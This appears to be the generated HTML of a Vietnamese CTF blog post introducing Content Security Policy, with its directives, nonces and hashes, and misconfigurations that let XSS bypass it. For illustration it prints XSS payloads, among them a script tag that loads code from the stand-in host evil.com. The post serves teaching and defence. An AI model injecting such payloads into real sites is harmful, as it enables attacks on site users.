@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="dark">
+
+<head><script src="/p1c0L0.github.io/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=p1c0L0.github.io/livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>CSP (Content Security Policy) | p1c0L0</title>
+<meta name="keywords" content="">
+<meta name="description" content="Giới thiệu về CSP (Content Security Policy)
+1. CSP là gì?
+
+
+CSP (Content Security Policy) là một cơ chế bảo mật phía client giúp ngăn chặn các tấn công dạng XSS, data injection,..v.v..  bằng cách kiểm soát source mà browser được phép tải và thực thi tài nguyên (scripts, styles, images, frames, fonts, ..v.v..)
+
+
+Nói dễ hiểu ra thì là: CSP = Whitelist các nguồn an toàn mà browser được phép dùng">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/p1c0L0.github.io/ctf/web-security/csp-content-security-policy/">
+<link crossorigin="anonymous" href="/p1c0L0.github.io/assets/css/stylesheet.76a739ec9e19c0128deb6be5591d168c8e3b9a8640e14dc34a2f248f674ef884.css" integrity="sha256-dqc57J4ZwBKN62vlWR0WjI47moZA4U3DSi8kj2dO&#43;IQ=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/p1c0L0.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/p1c0L0.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/p1c0L0.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/p1c0L0.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/p1c0L0.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/p1c0L0.github.io/ctf/web-security/csp-content-security-policy/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript><link rel="icon" type="image/png" sizes="32x32" href="https://dotamduc.github.io/p1c0L0.github.io/favicon.png">
+<link rel="icon" type="image/png" sizes="16x16" href="https://dotamduc.github.io/p1c0L0.github.io/favicon.png">
+<link rel="shortcut icon" href="https://dotamduc.github.io/p1c0L0.github.io/favicon.png">
+<link rel="apple-touch-icon" href="https://dotamduc.github.io/p1c0L0.github.io/favicon.png">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/p1c0L0.github.io/" accesskey="h" title="p1c0L0 (Alt + H)">p1c0L0</a>
+            <div class="logo-switches">
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/p1c0L0.github.io/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/p1c0L0.github.io/ctf/" title="CTF">
+                    <span>CTF</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/p1c0L0.github.io/achievements/" title="Achievements">
+                    <span>Achievements</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/p1c0L0.github.io/contact/" title="Contact">
+                    <span>Contact</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      CSP (Content Security Policy)
+    </h1>
+    <div class="post-meta">
+
+</div>
+  </header> 
+  <div class="post-content"><h3 id="giới-thiệu-về-csp-content-security-policy">Giới thiệu về CSP (Content Security Policy)<a hidden class="anchor" aria-hidden="true" href="#giới-thiệu-về-csp-content-security-policy">#</a></h3>
+<h4 id="1-csp-là-gì">1. CSP là gì?<a hidden class="anchor" aria-hidden="true" href="#1-csp-là-gì">#</a></h4>
+<ul>
+<li>
+<p>CSP (Content Security Policy) là một cơ chế bảo mật phía client giúp ngăn chặn các tấn công dạng XSS, data injection,..v.v..  bằng cách kiểm soát source mà browser được phép tải và thực thi tài nguyên (scripts, styles, images, frames, fonts, ..v.v..)</p>
+</li>
+<li>
+<p>Nói dễ hiểu ra thì là: CSP = Whitelist các nguồn an toàn mà browser được phép dùng</p>
+</li>
+<li>
+<p>CSP được triển khai bằng HTTP header hoặc meta tag, thường thấy dưới dạng:</p>
+</li>
+</ul>
+<pre tabindex="0"><code class="language-java!" data-lang="java!">Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39; https://apis.google.com; img-src *;
+</code></pre><h4 id="2-mục-tiêu-của-csp">2. Mục tiêu của CSP<a hidden class="anchor" aria-hidden="true" href="#2-mục-tiêu-của-csp">#</a></h4>
+<ul>
+<li>
+<p>CSP được sinh ra để:</p>
+<ul>
+<li>
+<p>Ngăn chèn mã độc (malicious script) do XSS.</p>
+</li>
+<li>
+<p>Giới hạn việc tải nội dung từ nguồn không tin cậy.</p>
+</li>
+<li>
+<p>Ngăn kẻ tấn công exfiltrate dữ liệu qua domain bên ngoài.</p>
+</li>
+<li>
+<p>Giảm thiểu thiệt hại nếu trang web bị chèn nội dung.</p>
+</li>
+</ul>
+</li>
+</ul>
+<p><strong>Cách hoạt động của CSP</strong></p>
+<ul>
+<li>
+<p>Khi trình duyệt nhận được header CSP, nó sẽ:</p>
+<ul>
+<li>
+<p>Đọc policy</p>
+</li>
+<li>
+<p>Chặn các tài nguyên không nằm trong danh sách cho phép.</p>
+</li>
+<li>
+<p>Ghi lại các lỗi vi phạm CSP (thường gửi đến <code>report-uri</code> hoặc <code>report-to</code>).</p>
+</li>
+</ul>
+</li>
+</ul>
+<p><strong>Ví dụ:</strong></p>
+<pre tabindex="0"><code class="language-java!" data-lang="java!">Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39; https://cdn.jsdelivr.net
+</code></pre><p><code>default-src 'self'</code>: chỉ cho phép tài nguyên cùng domain</p>
+<p><code>script-src</code>: chỉ cho phép chạy JS nội bộ hoặc từ jsDelivr</p>
+<p>Nếu hacker cố chèn <code>&lt;script src=&quot;https://evil.com/xss.js&quot;&gt;&lt;/script&gt;</code>, trình duyệt sẽ chặn</p>
+<p><strong>CSP và XSS</strong></p>
+<ul>
+<li>Không có CSP:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&lt;script&gt;alert(1)&lt;/script&gt;&#34;</span>&gt;
+</span></span></code></pre></div><p>→ Chạy <code>alert(1)</code></p>
+<ul>
+<li>Có CSP:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>Content<span style="color:#f92672">-</span>Security<span style="color:#f92672">-</span>Policy: script<span style="color:#f92672">-</span>src <span style="color:#960050;background-color:#1e0010">&#39;</span>self<span style="color:#960050;background-color:#1e0010">&#39;</span>
+</span></span></code></pre></div><p>→ Browser chặn script inline vì không nằm trong whitelist</p>
+<p>CSP là lá chắn XSS thứ hai, sau khi developer đã sanitize input.</p>
+<p><strong>Các directive phổ biến trong CSP</strong></p>
+<ul>
+<li><code>Directive</code>: mô tả</li>
+<li><code>default-src</code>:	nguồn mặc định cho tất cả loại tài nguyên</li>
+<li><code>script-src</code>:	nguồn được phép cho script</li>
+<li><code>style-src</code>:	nguồn được phép cho CSS</li>
+<li><code>img-src</code>:	nguồn được phép cho hình ảnh</li>
+<li><code>font-src</code>:	nguồn được phép cho font</li>
+<li><code>frame-src</code>:	nguồn cho iframe</li>
+<li><code>connect-src</code>:	cho phép kết nối AJAX/WebSocket</li>
+<li><code>report-uri /report-to</code>:	gửi báo cáo CSP vi phạm</li>
+</ul>
+<p><strong>Ví dụ về 1 CSP mạnh:</strong></p>
+<pre tabindex="0"><code class="language-java!" data-lang="java!">Content-Security-Policy: default-src &#39;none&#39;; script-src &#39;self&#39;; style-src &#39;self&#39;; img-src &#39;self&#39;; object-src &#39;none&#39;; base-uri &#39;none&#39;; form-action &#39;self&#39;;
+</code></pre><p><strong>CSP LEVEL</strong></p>
+<ul>
+<li>
+<p>CSP Level 1: cơ bản, chỉ whitelist nguồn.</p>
+</li>
+<li>
+<p>CSP Level 2: hỗ trợ nonce &amp; hash.</p>
+</li>
+<li>
+<p>CSP Level 3: thêm strict-dynamic, unsafe-hashes, report-to.</p>
+</li>
+</ul>
+<p><strong>Nonce &amp; Hash trong CSP</strong></p>
+<ul>
+<li>Dành cho các trang cần inline script.</li>
+<li>Dùng nonce:</li>
+</ul>
+<pre tabindex="0"><code class="language-java!" data-lang="java!">Content-Security-Policy: script-src &#39;nonce-h3h3&#39;
+&lt;script nonce=&#34;h3h3&#34;&gt;alert(&#39;1&#39;);&lt;/script&gt;
+</code></pre><p>→ Browser chỉ chạy script có đúng nonce hợp lệ.</p>
+<ul>
+<li>Dùng hash:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>Content<span style="color:#f92672">-</span>Security<span style="color:#f92672">-</span>Policy: script<span style="color:#f92672">-</span>src <span style="color:#960050;background-color:#1e0010">&#39;</span>sha256<span style="color:#f92672">-</span>abcd123...<span style="color:#960050;background-color:#1e0010">&#39;</span>
+</span></span></code></pre></div><p>→ Browser chỉ cho phép chạy inline script có hash khớp.</p>
+<p><strong>Bypass CSP trong CTF/Web Exploitation</strong></p>
+<ul>
+<li>
+<p>Trong CTF, nhiều challenge CSP thường bị cấu hình sai, ví dụ:</p>
+</li>
+<li>
+<p>Cho phép <code>'unsafe-inline'</code> → vẫn chạy được <code>XSS inline</code></p>
+</li>
+<li>
+<p>Cho phép <code>data</code>: hoặc <code>blob:</code> → có thể inject payload JS</p>
+</li>
+<li>
+<p>Cho phép <code>wildcard *</code> trong <code>script-src</code> → mất tác dụng CSP</p>
+</li>
+<li>
+<p>Chỉ giới hạn <code>default-src</code> mà không có <code>script-src</code> riêng</p>
+</li>
+</ul>
+<p>Ví dụ bypass:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://evil.com/xss.js&#34;</span><span style="color:#f92672">&gt;&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
+</span></span></code></pre></div><p>Nếu CSP có: <code>script-src *</code>; <code>object-src 'none'</code>;  → payload vẫn chạy bình thường.</p>
+<p><strong>Cách kiểm tra CSP</strong></p>
+<ul>
+<li>Mở <code>DevTools</code> → <code>Console</code>: xem lỗi <code>“Refused to load script”</code></li>
+</ul>
+<p>Trang web online kiểm tra:
+<a href="https://csp-evaluator.withgoogle.com/">https://csp-evaluator.withgoogle.com/</a>
+<a href="https://report-uri.com/">https://report-uri.com/</a></p>
+<p><strong>Tóm cái quần lại</strong></p>
+<ul>
+<li>CSP <strong>không</strong> thay thế việc sanitize input, nhưng nó là lớp bảo vệ mạnh để chống <strong>XSS</strong>, <strong>clickjacking</strong>, và <strong>content injection</strong></li>
+</ul>
+<p><strong>&lt;CÒN PART 2: Các lỗi cấu hình CSP thường gặp trong CTF&gt;</strong></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="http://localhost:1313/p1c0L0.github.io/">p1c0L0</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a><canvas id="matrix-bg"></canvas>
+
+<style>
+     
+    #matrix-bg {
+        position: fixed;
+        top: 0; left: 0;
+        width: 100vw; height: 100vh;
+        z-index: -9999;  
+        pointer-events: none;
+    }
+
+     
+    .emoji-reset {
+         
+        font-family: "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji", "Android Emoji", sans-serif !important;
+        
+         
+        color: initial !important; 
+        
+         
+        background: none !important; 
+        -webkit-text-fill-color: initial !important; 
+        -webkit-background-clip: border-box !important;
+
+         
+        text-shadow: none !important; 
+        
+         
+        font-style: normal !important;
+        display: inline-block !important;
+        font-weight: normal !important;
+    }
+</style>
+
+<script>
+    
+    const canvas = document.getElementById('matrix-bg');
+    const ctx = canvas.getContext('2d');
+
+    function resizeCanvas() {
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+    }
+    window.addEventListener('resize', resizeCanvas);
+    resizeCanvas();
+
+    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*';
+    const fontSize = 14;
+    const columns = Math.ceil(window.innerWidth / fontSize);
+    const drops = Array(columns).fill(1);
+
+    function draw() {
+        
+        ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+        
+        ctx.fillStyle = 'rgba(0, 255, 65, 0.15)'; 
+        ctx.font = fontSize + 'px monospace';
+
+        for (let i = 0; i < drops.length; i++) {
+            const text = chars.charAt(Math.floor(Math.random() * chars.length));
+            ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+
+            if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                drops[i] = 0;
+            }
+            drops[i]++;
+        }
+    }
+    
+    
+    ctx.fillStyle = '#000000';
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
+    setInterval(draw, 35);
+
+
+    
+    document.addEventListener("DOMContentLoaded", function() {
+        
+        function rescueEmojis(node) {
+            
+            if (node.nodeType === 3) { 
+                const text = node.nodeValue;
+                
+                const emojiRegex = /[\p{Emoji_Presentation}\p{Extended_Pictographic}\u{1F300}-\u{1F6FF}\u{1F900}-\u{1F9FF}\u{2600}-\u{26FF}\u{2700}-\u{27BF}]/gu;
+                
+                if (text.match(emojiRegex)) {
+                    const span = document.createElement('span');
+                    
+                    span.innerHTML = text.replace(emojiRegex, '<span class="emoji-reset">$&</span>');
+                    node.parentNode.replaceChild(span, node);
+                }
+            } 
+            
+            else if (node.nodeType === 1 && 
+                     !['SCRIPT', 'STYLE', 'TEXTAREA', 'CODE', 'PRE'].includes(node.tagName) && 
+                     !node.classList.contains('emoji-reset')) {
+                Array.from(node.childNodes).forEach(child => rescueEmojis(child));
+            }
+        }
+        
+        
+        rescueEmojis(document.body);
+    });
+</script>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+</body>
+
+</html>
